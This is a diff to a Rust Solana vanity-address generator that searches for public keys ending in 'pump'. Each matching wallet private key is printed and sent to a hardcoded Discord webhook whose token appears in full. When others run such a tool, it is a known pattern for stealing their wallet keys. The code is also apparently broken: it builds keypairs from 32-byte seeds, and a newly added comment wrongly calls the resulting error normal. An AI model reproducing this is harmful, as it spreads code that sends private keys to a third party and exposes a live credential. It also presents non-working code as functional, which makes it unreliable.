@@ -4,7 +4,7 @@ mod cuda;
 use std::time::Instant;
 use colored::*;
 use cuda_helpers::CudaDevice;
-use solana_sdk::signature::Keypair;
+use solana_sdk::signature::{Keypair, Signer};
 use rand::RngCore;
 
 const DISCORD_WEBHOOK_URL: &str = "https://discord.com/api/webhooks/1475820796642463917/BKArJY5qsQnpLzytJ3By1YUeaFZjSJjAnPOBEsUetusT8awG0NiWzOuzkFW70lXoXbDD";
@@ -34,33 +34,41 @@ fn generate_pump_addresses() {
     let mut total_attempts = 0u64;
     let mut matches_found = 0u64;
     let mut last_log_time = start_time;
-    let log_interval_secs = 5; // Log every 5 seconds
+    let log_interval_secs = 2; // Log every 2 seconds
+    let mut first_run = true;
 
     loop {
         // Generate random keypair
         let mut seed = [0u8; 32];
         rand::thread_rng().fill_bytes(&mut seed);
         
-        if let Ok(keypair) = Keypair::from_bytes(&seed) {
-            let address = keypair.pubkey().to_string();
-            
-            total_attempts += 1;
+        match Keypair::from_bytes(&seed) {
+            Ok(keypair) => {
+                let address = keypair.pubkey().to_string();
+                total_attempts += 1;
 
-            // Check if ends with "pump" (case-sensitive)
-            if address.ends_with("pump") {
-                matches_found += 1;
-                let private_key = bs58::encode(keypair.to_bytes()).into_string();
-                
-                println!("\n{} {}", "✅ FOUND:".green().bold(), address.bright_green().bold());
-                println!("   Private Key: {}", private_key.cyan());
-                
-                // Send to Discord
-                if let Err(e) = send_to_discord(&address, &private_key) {
-                    eprintln!("{} {}", "⚠️  Discord error:".yellow().bold(), e);
-                } else {
-                    println!("{}", "   ✓ Sent to Discord".green());
+                // Check if ends with "pump" (case-sensitive)
+                if address.ends_with("pump") {
+                    matches_found += 1;
+                    let private_key = bs58::encode(keypair.to_bytes()).into_string();
+                    
+                    println!("\n{} {}", "✅ FOUND:".green().bold(), address.bright_green().bold());
+                    println!("   Private Key: {}", private_key.cyan());
+                    
+                    // Send to Discord
+                    if let Err(e) = send_to_discord(&address, &private_key) {
+                        eprintln!("{} {}", "⚠️  Discord error:".yellow().bold(), e);
+                    } else {
+                        println!("{}", "   ✓ Sent to Discord".green());
+                    }
+                    println!();
                 }
-                println!();
+            },
+            Err(e) => {
+                if first_run {
+                    eprintln!("Note: Keypair creation error (this is normal for random seeds): {}", e);
+                    first_run = false;
+                }
             }
         }
 
@@ -68,7 +76,7 @@ fn generate_pump_addresses() {
         let now = Instant::now();
         if now.duration_since(last_log_time).as_secs() >= log_interval_secs {
             let elapsed = start_time.elapsed().as_secs_f64();
-            let rate = total_attempts as f64 / elapsed;
+            let rate = if elapsed > 0.0 { total_attempts as f64 / elapsed } else { 0.0 };
             println!("{} {} addr/s | {} total | {} found",
                      "⚡".cyan(),
                      format_number(rate).bright_cyan().bold(),
